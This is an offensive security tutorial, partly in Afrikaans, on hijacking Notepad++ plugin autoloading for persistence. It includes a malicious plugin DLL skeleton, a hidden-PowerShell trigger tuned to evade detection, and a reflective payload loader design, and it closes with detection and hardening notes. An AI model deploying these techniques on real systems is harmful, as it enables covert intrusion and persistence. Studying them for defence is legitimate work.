# Notepad++ Plugin Autoload Persistence & Execution

{{#include ../../banners/hacktricks-training.md}}

Notepad++ sal **autoload every plugin DLL found under its `plugins` subfolders** by launch. Om 'n kwaadwillige plugin in enige **writable Notepad++ installation** te laat val, gee code execution binne `notepad++.exe` elke keer wanneer die editor begin, wat misbruik kan word vir **persistence**, stealthy **initial execution**, of as 'n **in-process loader** as die editor elevated begin word.

Since **Notepad++ 7.6+** the expected manual-install layout is **one subfolder per plugin** (`plugins\<PluginName>\<PluginName>.dll`). In **portable mode** (presence of `doLocalConf.xml` next to `notepad++.exe`), the whole application tree stays local to that directory, which often turns copied/admin tool bundles into an easy user-writable execution surface.

## Writable plugin locations
- Standard install: `C:\Program Files\Notepad++\plugins\<PluginName>\<PluginName>.dll` (usually requires admin to write).
- Writable options for low-privileged operators:
- Use the **portable Notepad++ build** in a user-writable folder.
- Copy `C:\Program Files\Notepad++` to a user-controlled path (e.g. `%LOCALAPPDATA%\npp\`) and run `notepad++.exe` from there.
- Hunt for **admin tool bundles**, extracted zip copies, or help-desk toolkits that already contain `doLocalConf.xml` and live outside `Program Files`.
- Each plugin gets its own subfolder under `plugins` and is loaded automatically at startup; menu entries appear under **Plugins**.

Quick triage:
```cmd
where /r C:\ notepad++.exe 2>nul
for /d %D in ("%ProgramFiles%\Notepad++" "%ProgramFiles(x86)%\Notepad++" "%LOCALAPPDATA%\*notepad*" "%USERPROFILE%\Desktop\*notepad*") do @if exist "%~fD\plugins" echo [*] %~fD
icacls "C:\Program Files\Notepad++\plugins" 2>nul
```
## Plugin load points (execution primitives)
Notepad++ verwag spesifieke **exported functions**. Hierdie word almal tydens initialisation geroep, wat verskeie execution surfaces gee:
- **`DllMain`** — loop onmiddellik op DLL load (eerste execution point).
- **`setInfo(NppData)`** — word een keer op load geroep om Notepad++ handles te verskaf; tipiese plek om menu items te registreer.
- **`getName()`** — gee die plugin name terug wat in die menu gewys word.
- **`getFuncsArray(int *nbF)`** — gee menu commands terug; selfs al is dit leeg, word dit tydens startup geroep.
- **`beNotified(SCNotification*)`** — ontvang Notepad++ / Scintilla events (nuttig om payloads uit te stel totdat ’n user action of editor event plaasvind).
- **`messageProc(UINT, WPARAM, LPARAM)`** — message handler, nuttig vir groter data exchanges.
- **`isUnicode()`** — compatibility flag wat by load nagegaan word.

Die meeste exports kan as **stubs** geïmplementeer word; execution kan van **DllMain** of enige callback hierbo plaasvind tydens autoload.

## Minimal malicious plugin skeleton
Compileer ’n DLL met die verwagte exports en plaas dit in `plugins\\MyNewPlugin\\MyNewPlugin.dll` onder ’n writable Notepad++ folder:
```c
BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID) { if (r == DLL_PROCESS_ATTACH) MessageBox(NULL, TEXT("Hello from Notepad++"), TEXT("MyNewPlugin"), MB_OK); return TRUE; }
extern "C" __declspec(dllexport) void setInfo(NppData) {}
extern "C" __declspec(dllexport) const TCHAR *getName() { return TEXT("MyNewPlugin"); }
extern "C" __declspec(dllexport) FuncItem *getFuncsArray(int *nbF) { *nbF = 0; return NULL; }
extern "C" __declspec(dllexport) void beNotified(SCNotification *) {}
extern "C" __declspec(dllexport) LRESULT messageProc(UINT, WPARAM, LPARAM) { return TRUE; }
extern "C" __declspec(dllexport) BOOL isUnicode() { return TRUE; }
```
1. Build the DLL (Visual Studio/MinGW).
2. Create the plugin subfolder under `plugins` and drop the DLL inside.
3. Restart Notepad++; the DLL is loaded automatically, executing `DllMain` and subsequent callbacks.

## Lae-geraas sneller-patroon via `beNotified`
Vir OPSEC moet baie payloads **nie** vanaf `DllMain` af vuur nie. ’n Stiller patroon is om die plugin skoon te laat laai, en dan eers uit te voer ná ’n realistiese editor-gebeurtenis soos **startup complete**, **buffer activation**, of die **first typed character**.
```c
static bool fired = false;
extern "C" __declspec(dllexport) void beNotified(SCNotification *n) {
if (fired) return;
if (n->nmhdr.code == NPPN_READY ||
n->nmhdr.code == NPPN_BUFFERACTIVATED ||
n->nmhdr.code == SCN_CHARADDED) {
fired = true;
WinExec("powershell -w hidden -nop -c <payload>", SW_HIDE);
}
}
```
Dit stem beter ooreen met publieke offensiewe navorsing as ’n lawaaierige `DllMain` beacon: die DLL word steeds by opstart outoload, maar die kwaadwillige aksie word vertraag totdat Notepad++ werklik in gebruik lyk.

## Using the plugin config directory as secondary storage
Notepad++ stel `NPPM_GETPLUGINSCONFIGDIR` bloot, wat die **huidige gebruiker se plugin configuration directory** teruggee. ’n Kwaadwillige plugin kan dit gebruik om die on-disk DLL minimaal te hou terwyl dit encrypted config, staged payloads, of tasking files stoor in ’n pad wat inpas by normale plugin state.
```c
wchar_t cfg[MAX_PATH] = {0};
SendMessage(nppData._nppHandle, NPPM_GETPLUGINSCONFIGDIR, MAX_PATH, (LPARAM)cfg);
// Example result: %AppData%\Notepad++\plugins\config
```
Operasioneel is dit nuttig wanneer jy wil hê:
- ’n klein autoloaded bootstrap DLL;
- per-user tasking sonder om weer aan die main plugin binary te raak;
- om die **autoload trigger** van die swaarder tweede stage te skei.

## Reflective loader plugin pattern
’n Weaponized plugin kan Notepad++ in ’n **reflective DLL loader** verander:
- Bied ’n minimale UI/menu-inskrywing aan (bv. "LoadDLL").
- Aanvaar ’n **file path** of **URL** om ’n payload DLL te fetch.
- Map die DLL reflective in die current process en roep ’n geëxporteerde entry point aan (bv. ’n loader function binne die fetched DLL).
- Voordeel: hergebruik ’n GUI process wat onskuldig lyk in plaas daarvan om ’n nuwe loader te spawn; payload erf die integriteit van `notepad++.exe` (insluitend verhoogde contexts).
- Trade-offs: om ’n **unsigned plugin DLL** na disk te drop is noisy; ’n praktiese variasie is om die autoloaded plugin net as ’n stub te gebruik en die regte implant elders encrypted/staged te hou.

## Detection and hardening notes
- Block of monitor **writes to Notepad++ plugin directories** (insluitend portable copies in user profiles); enable controlled folder access of application allowlisting.
- Alert op **new unsigned DLLs** onder `plugins`, changes to portable Notepad++ trees, en ongewone **child processes/network activity** vanaf `notepad++.exe`.
- Baseline legitimate plugins en ondersoek enige nuwe DLL wat die normale Notepad++ plugin interface export, maar ook shells, PowerShell, of network beacons spawn.
- Enforce plugin installation via **Plugins Admin** only, en beperk execution van portable copies vanaf untrusted paths.

## References
- [TrustedSec - Notepad++ Plugins: Plug and Payload](https://trustedsec.com/blog/notepad-plugins-plug-and-payload)
- [Notepad++ User Manual - Plugins](https://npp-user-manual.org/docs/plugins/)
- [Notepad++ User Manual - Plugin Communication](https://npp-user-manual.org/docs/plugin-communication/)

{{#include ../../banners/hacktricks-training.md}}
